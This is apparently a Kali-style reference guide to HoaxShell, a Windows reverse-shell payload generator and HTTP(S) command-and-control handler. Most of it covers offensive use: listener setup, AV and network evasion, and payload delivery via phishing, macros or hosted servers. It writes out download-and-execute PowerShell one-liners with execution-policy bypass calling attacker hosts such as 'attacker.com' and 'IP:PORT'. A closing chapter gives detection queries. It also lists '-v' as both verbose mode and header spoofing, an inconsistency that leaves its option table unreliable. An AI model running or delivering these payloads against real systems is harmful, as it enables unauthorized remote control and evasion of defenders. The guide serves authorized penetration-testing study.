---
tool_name: "hoaxshell"
display_name: "HoaxShell"
mitre_tactic: "command_and_control"
mitre_tactic_id: "TA0011"
mitre_subcategory: "c2_frameworks"
install_command: "sudo apt install hoaxshell"
version: "0.0~git20250119.e1bba89"
github_repo: "https://github.com/t3l3machus/hoaxshell"
kali_tools_page: "https://www.kali.org/tools/hoaxshell/"
difficulty_level: "beginner-to-intermediate"
requires_root: true
gui_available: false
tags: ["c2", "reverse-shell", "powershell", "http", "beacon", "staging"]
related_tools: ["villain", "netcat", "socat", "metasploit-framework"]
---

# HoaxShell

## Chapter 1: Introduction & Overview

### What is HoaxShell?
HoaxShell is a Windows reverse shell payload generator and handler that abuses the HTTP(S) protocol to establish a beacon-like reverse shell. Unlike traditional reverse shells that provide a full interactive shell, HoaxShell creates a pseudo-shell that promotes the illusion of having a shell while operating over HTTP(S) requests, making it harder to detect by network monitoring tools.

### History & Background
- **Created:** 2022 by t3l3machus
- **Maintained:** Active project (3.5k stars, 524 forks)
- **License:** BSD-2-Clause
- **Purpose:** Windows reverse shell generation, HTTP(S) C2, AV evasion

HoaxShell was designed to bypass traditional network-based detection by abusing HTTP(S) for command and control. The tool generates PowerShell payloads that communicate with a command-and-control server using HTTP(S) requests, making the traffic appear as legitimate web browsing.

### When to Use This Tool
- **Penetration testing:** Establishing reverse shells on Windows targets
- **Red team operations:** Initial access and command execution
- **AV evasion testing:** Testing detection capabilities against HTTP-based C2
- **Quick engagements:** Fast payload generation and handler setup

### When NOT to Use This Tool
- Without explicit written authorization from the target organization
- On production systems without proper planning
- When a full interactive shell is required (use other tools)
- For long-term C2 operations (limited functionality compared to full C2 frameworks)

### Legal and Ethical Considerations
- **Always obtain written permission** before deploying payloads
- **Understand the scope** - know exactly what systems you are authorized to access
- **Use obfuscation** - the default payload is now detected by AMSI
- **Document all activity** - maintain records of all access obtained

### Key Concepts
- **Pseudo-shell:** A command interface that doesn't provide a real PTY
- **Beacon-like:** Periodic check-in behavior rather than persistent connection
- **HTTP(S) abuse:** Using web protocols for C2 communication
- **Session ID:** Unique identifier for each shell session
- **Invoke-Expression:** PowerShell method for executing commands (default)

---

## Chapter 2: Installation & Setup

### System Requirements
- **Minimum RAM:** 512 MB
- **Disk Space:** 100 MB
- **Network:** HTTP(S) connectivity to target
- **Privileges:** Root required for listener operations
- **Python:** 3.6+

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install hoaxshell
```

#### Method 2: From Source
```bash
git clone https://github.com/t3l3machus/hoaxshell.git
cd hoaxshell
pip3 install -r requirements.txt
chmod +x hoaxshell.py
```

### Dependencies
- Python 3.6+
- ipython
- pyperclip

### Initial Configuration
After installation, verify the tool is available:
```bash
hoaxshell --help
```

---

## Chapter 3: Core Concepts

### How HoaxShell Works
1. **Listener starts:** HoaxShell starts an HTTP(S) server on the attacker's machine
2. **Payload executes:** The PowerShell payload runs on the target
3. **Check-in:** The payload sends HTTP(S) requests to the listener at regular intervals
4. **Command delivery:** The listener responds with commands to execute
5. **Output collection:** The payload sends command output back via HTTP(S) requests

### Communication Flow
```
Target (PowerShell) -> HTTP(S) Request -> Listener (HoaxShell)
Target (PowerShell) <- HTTP(S) Response <- Listener (HoaxShell)
```

### Session Management
- Each session has a unique ID embedded in the payload
- Sessions are maintained through HTTP(S) cookies/headers
- Sessions can be restored if the listener restarts (using `-g` mode)

### Payload Types
- **Invoke-Expression (default):** Uses PowerShell's `Invoke-Expression` to execute commands
- **File-based (-x):** Writes commands to a file and executes from there
- **Raw (-r):** Generates unencoded payload for manual modification

---

## Chapter 4: Basic Usage

### Starting a Listener
```bash
# Basic HTTP listener
sudo hoaxshell -s <your_ip>

# Example
sudo hoaxshell -s 192.168.1.100
```

### Using the Payload
1. Copy the generated PowerShell payload from the terminal
2. Execute it on the target Windows machine
3. The shell session will appear in HoaxShell

### Executing Commands
```bash
# Once connected, you can run PowerShell commands:
whoami
hostname
ipconfig /all
dir C:\Users
```

### HTTPS Listener
```bash
# Generate self-signed certificate
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365

# Start HTTPS listener
sudo hoaxshell -s <your_ip> -c cert.pem -k key.pem
```

### Trusted Domain HTTPS
```bash
# Use a trusted certificate for better evasion
sudo hoaxshell -s your.domain.com -t -c cert.pem -k key.pem
```

---

## Chapter 5: Advanced Usage

### Obfuscation Options
```bash
# Use Invoke-RestMethod instead of Invoke-WebRequest
sudo hoaxshell -s <your_ip> -i

# Set a custom header name (avoid random header detection)
sudo hoaxshell -s <your_ip> -i -H "Authorization"

# File-based execution (no Invoke-Expression)
sudo hoaxshell -s <your_ip> -x "C:\Users\\\$env:USERNAME\.local\hack.ps1"
```

### Constraint Language Mode
```bash
# Generate payload for constrained language mode
sudo hoaxshell -s <your_ip> -cm
```

### Tunneling Integration
```bash
# Using ngrok
sudo hoaxshell -ng

# Using localtunnel
sudo hoaxshell -lt
```

### Restoring Sessions
```bash
# If the listener crashes, restore the session
sudo hoaxshell -s <your_ip> -g
```

### Custom Server Version
```bash
# Spoof the Server header
sudo hoaxshell -s <your_ip> -v "Apache/2.4.41 (Ubuntu)"
```

---

## Chapter 6: Integration & Automation

### Scripting HoaxShell
HoaxShell can be automated through its command-line interface:
```bash
# Generate and save payload
hoaxshell -s <your_ip> -r -o payload.ps1

# Start listener in background
nohup hoaxshell -s <your_ip> > hoaxshell.log 2>&1 &
```

### Integration with Other Tools
- **Villain:** Use HoaxShell as the underlying C2 for Villain framework
- **Custom scripts:** Parse HoaxShell output for logging and monitoring
- **Web servers:** Host payloads on compromised web servers

### Automation Workflows
```bash
# Automated payload delivery
# 1. Generate payload
hoaxshell -s <your_ip> -r -o /tmp/payload.ps1

# 2. Host payload (using Python HTTP server)
cd /tmp && python3 -m http.server 8080

# 3. Start listener
hoaxshell -s <your_ip>

# 4. Deliver payload to target (e.g., via phishing)
```

---

## Chapter 7: OPSEC & Defense Evasion

### Detection Avoidance
- **Use custom headers:** Set `-H "Authorization"` to avoid random header detection
- **Invoke-RestMethod:** Use `-i` flag for less suspicious PowerShell utility
- **File-based execution:** Use `-x` to avoid Invoke-Expression detection
- **Obfuscate payloads:** Manually obfuscate the generated payload
- **HTTPS with trusted certs:** Use `-t` with a valid certificate

### Payload Obfuscation
```bash
# Manual obfuscation techniques:
# 1. String concatenation
# 2. Variable replacement
# 3. Character encoding
# 4. Environment variable abuse

# Example: Basic obfuscation
$payload = "I" + "EX" + "(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

### Best Practices
1. Always obfuscate payloads before deployment
2. Use HTTPS with valid certificates when possible
3. Set realistic sleep intervals to mimic legitimate traffic
4. Monitor for AMSI detection and adapt
5. Use the `-g` option to enable session restoration

### Known Limitations
- AMSI detection (as of 2022-10-18) - requires obfuscation
- Not a full interactive shell (pseudo-shell only)
- Commands that start interactive sessions will hang
- Limited output encoding accuracy with `-cm` mode

---

## Chapter 8: Troubleshooting & FAQ

### Common Issues

**Problem: Payload doesn't connect**
- Verify the listener is running on the correct IP and port
- Check firewall rules on the attacker's machine
- Ensure PowerShell execution policy allows the payload
- Test network connectivity from target to attacker

**Problem: Shell hangs after command**
- Don't run commands that start interactive sessions (e.g., `powershell`, `cmd.exe`)
- Use non-interactive commands (e.g., `cmd /c dir /a`)
- Check the sleep interval (default 0.8s)

**Problem: AMSI detection**
- Obfuscate the payload using tools like Invoke-Obfuscation
- Use file-based execution (`-x` option)
- Use a custom header (`-H "Authorization"`)

**Problem: Session dropped**
- Use `-g` mode to restore sessions
- Verify the payload is still running on the target
- Check network stability

### Debug Mode
```bash
# Run with verbose output
sudo hoaxshell -s <your_ip> -v
```

---

## Chapter 9: Real-World Scenarios

### Quick Shell Establishment

```bash
# 1. Start HTTPS listener
sudo hoaxshell -s your.domain.com -t -c cert.pem -k key.pem

# 2. Execute payload on target Windows machine
# Copy the generated PowerShell payload and run in cmd.exe or PowerShell

# 3. Execute commands in the pseudo-shell
whoami /all
systeminfo
net user
ipconfig /all
dir C:\Users
```

### Custom Header for Evasion

```bash
# Use Authorization header to avoid detection
sudo hoaxshell -s <your_ip> -i -H "Authorization"

# The payload will use Invoke-RestMethod with Authorization header
# This mimics legitimate API calls and avoids random header detection
```

### File-Based Payload Delivery

```bash
# Generate raw payload
sudo hoaxshell -s <your_ip> -r -o /tmp/payload.ps1

# Host payload on HTTP server
cd /tmp && python3 -m http.server 8080

# Start listener
sudo hoaxshell -s <your_ip>

# Deliver payload to target (e.g., via Word macro, LNK file, or exploit)
# On target:
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker:8080/payload.ps1')"
```

### Using with Tunneling

```bash
# Through ngrok for external access
# 1. Start ngrok tunnel
ngrok http 8080

# 2. Start hoaxshell with ngrok URL
sudo hoaxshell -s <ngrok_subdomain>.ngrok.io -t

# Through localtunnel
sudo hoaxshell -lt
```

### Constrained Language Mode Target

```bash
# When targeting systems with constrained language mode
sudo hoaxshell -s <your_ip> -cm

# The payload uses alternative PowerShell methods compatible with CLM
```

### Session Restoration After Crash

```bash
# If the listener crashes, restore the session
sudo hoaxshell -s <your_ip> -g

# This reconnects to the existing session without re-executing the payload
```

---

## Chapter 10: Command Reference

### Command-Line Options

| Option | Description |
|---|---|
| `-s <ip>` | Server IP address (required) |
| `-p <port>` | Server port (default: 8080) |
| `-c <cert>` | SSL certificate file |
| `-k <key>` | SSL key file |
| `-t` | Trusted domain mode |
| `-i` | Use Invoke-RestMethod |
| `-x <path>` | File-based execution path |
| `-r` | Generate raw payload |
| `-o <file>` | Output payload to file |
| `-g` | Restore previous session |
| `-v <version>` | Spoof Server header |
| `-H <header>` | Custom HTTP header name |
| `-cm` | Constrained language mode |
| `-ng` | Use ngrok tunnel |
| `-lt` | Use localtunnel |

### Payload Variants

| Variant | Description |
|---|---|
| Invoke-Expression (default) | Uses IEX to execute commands |
| File-based (`-x`) | Writes commands to file, executes from there |
| Raw (`-r`) | Unencoded payload for manual modification |

---

## Chapter 11: Detection and Defense

### Network Signatures

- HTTP(S) requests with PowerShell User-Agent
- Periodic HTTP(S) beaconing to same endpoint
- Large HTTP(S) POST requests (command output)
- Unusual HTTP headers (custom headers from HoaxShell)

### Host-Based Detection

```powershell
# Monitor for suspicious PowerShell activity
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |
  Where-Object {$_.Message -like "*Invoke-WebRequest*" -or $_.Message -like "*Invoke-RestMethod*"}

# Check for HoaxShell process indicators
Get-Process | Where-Object {$_.ProcessName -eq "powershell" -and $_.CommandLine -like "*DownloadString*"}
```

### Defense Recommendations

1. Enable PowerShell script block logging
2. Monitor for Invoke-WebRequest/Invoke-RestMethod from non-browser processes
3. Implement AMSI and ETW logging
4. Use application whitelisting for PowerShell execution
5. Block outbound HTTP(S) from PowerShell by default

### AMSI Detection

```powershell
# Check AMSI events
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; ID=1116} |
  Where-Object {$_.Message -like "*HoaxShell*"}
```

---

## Resources

- **GitHub Repository:** https://github.com/t3l3machus/hoaxshell
- **Kali Tools Page:** https://www.kali.org/tools/hoaxshell/
- **RevShells.com:** https://revshells.com (web-based payload generation)
- **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
- **MITRE ATT&CK - Application Layer Protocol:** https://attack.mitre.org/techniques/T1071/
- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
- **Related Tools:** Villain, Netcat, Socat, Metasploit Framework

---

## Appendix: Quick Reference Card

### One-Liner Payloads

```powershell
# Default HTTP payload
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://IP:PORT/'); Invoke-HoaxShell -Verbose"

# HTTPS payload
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://DOMAIN/'); Invoke-HoaxShell -Verbose"

# File-based payload
powershell -ep bypass -c "Add-Content -Path 'C:\temp\shell.ps1' -Value (New-Object Net.WebClient).DownloadString('http://IP:PORT/'); & 'C:\temp\shell.ps1'"
```

### Common Commands in Pseudo-Shell

| Command | Description |
|---|---|
| `whoami /all` | Current user context |
| `systeminfo` | System information |
| `net user` | List users |
| `net localgroup administrators` | List admins |
| `ipconfig /all` | Network configuration |
| `dir C:\Users` | List user directories |
| `tasklist` | Running processes |
| `netstat -ano` | Active connections |
